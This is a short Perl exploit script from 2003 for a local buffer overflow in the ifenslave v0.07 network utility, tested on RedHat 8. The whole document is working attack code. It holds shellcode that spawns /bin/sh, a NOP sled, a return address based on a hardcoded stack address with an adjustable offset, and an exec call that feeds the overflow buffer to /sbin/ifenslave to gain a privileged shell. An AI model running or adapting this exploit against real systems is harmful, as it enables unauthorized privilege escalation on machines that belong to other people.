#!/usr/bin/perl
#
# expl-ifenslave.pl : Local buffer overflow exploit for
#                     ifsenslave v0.07
#
# Exploit tested on RedHat 8
#
# Author :
#    jlanthea [contact@jlanthea.net]
#
# Syntax :
#    perl expl-ifenslave.pl  # works for me with offset = -17

$shellcode =
        "\xeb\x1d\x5e\x29\xc0\x88\x46\x07\x89\x46\x0c\x89\x76\x08\xb0".
        "\x0b\x87\xf3\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x29\xc0\x40\xcd".
        "\x80\xe8\xde\xff\xff\xff/bin/sh";

$offset = "0";

if(@ARGV == 1) { $offset = $ARGV[0]; }
$nop     = "\x90";
$esp     = 0xbffff480;

for ($i = 0; $i < (48 - (length($shellcode)) - 4); $i++) {
    $buffer .= "$nop";
    }

$buffer .= $shellcode;
$buffer .= pack('l', ($esp + $offset));

print("Ifenslave local exploit by jlanthea - 2003\n");
print("The new return address: 0x", sprintf('%lx',($esp + $offset)),
"\n");
exec("/sbin/ifenslave '$buffer'");

